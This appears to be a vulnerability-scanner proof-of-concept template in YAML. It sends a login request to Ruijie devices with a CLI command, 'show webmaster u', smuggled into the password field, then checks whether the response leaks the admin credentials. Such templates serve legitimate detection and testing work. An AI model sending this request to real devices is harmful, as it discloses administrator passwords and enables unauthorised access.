name: poc-yaml-ruijie-password-disclosure
rules:
  - method: POST
    path: /login.php
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
    follow_redirects: false
    body: |
      username=admin&password=a?show+webmaster+u
    expression: |
      response.status==200 &&  response.content_type.contains("text/json") && response.body.bcontains(bytes('data":"WORD')) && response.body.bcontains(bytes('status":1')) && response.body.bcontains(bytes('admin'))
detail:
  author: abbin777
